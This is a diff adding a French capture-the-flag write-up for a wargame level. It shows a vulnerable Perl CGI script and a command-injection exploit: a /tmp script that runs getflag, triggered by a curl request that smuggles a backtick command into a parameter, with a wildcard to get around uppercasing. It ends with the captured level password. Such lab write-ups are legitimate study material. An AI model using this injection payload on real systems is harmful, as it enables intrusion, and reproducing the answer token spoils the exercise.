@@ -1,0 +1,57 @@
+On commence avec un script perl "level12.pl" :
+
+    #!/usr/bin/env perl
+    # localhost:4646
+    use CGI qw{param};
+    print "Content-type: text/html\n\n";
+
+    sub t {
+    $nn = $_[1];
+    $xx = $_[0];
+    $xx =~ tr/a-z/A-Z/;
+    $xx =~ s/\s.*//;
+    @output = `egrep "^$xx" /tmp/xd 2>&1`;
+    foreach $line (@output) {
+        ($f, $s) = split(/:/, $line);
+        if($s =~ $nn) {
+            return 1;
+        }
+    }
+    return 0;
+    }
+
+    sub n {
+    if($_[0] == 1) {
+        print("..");
+    } else {
+        print(".");
+    }
+    }
+
+    n(t(param("x"), param("y")));
+
+
+Il s'agit d'un script perl qui va prendre deux arguments, x et y.
+Il va capitaliser chaque lettre de x et supprimer tout ce qui suit le whitespace (ex : hello world -> HELLO).
+Il va ensuite chercher un match de l'argument x dans le fichier /tmp/xd, et s'il y a concordance,
+il va split la ligne en deux, et verifier que splitPart2 = y (ex : HELLO:bonjour, y = bonjour, bonjour == y)
+Si c'est vrai, il affiche '..', si c'est faux, il affiche '.'
+
+
+L'exploit se trouve a cette ligne :
+    @output = `egrep "^$xx" /tmp/xd 2>&1`;
+
+Il y a une utilisation de backticks, ce qui veut dire que cela va etre execute par le shell comme une commande.
+On va donc l'exploiter en ecrivant un script qu'on va appeler GETFLAG
+    echo '#!/bin/sh' > /tmp/GETPWD
+    echo "getflag > /tmp/token" >> /tmp/GETPWD
+    chmod 777 /tmp/GETPWD
+
+On va ensuite le lancer en faisant un curl, lui donnant le path vers notre script
+    curl localhost:4646?x='`/*/GETPWD`'
+
+On utilise une wildcard au lieu de mettre le path au complet, car le script va transformer tmp en TMP,
+ce qui va casser notre path. En utilisant une wildcard, on va executer GETPWD ou qu'il soit
+
+
+password13 : g1qKMiRpXf53AWhDaU7FEkczr
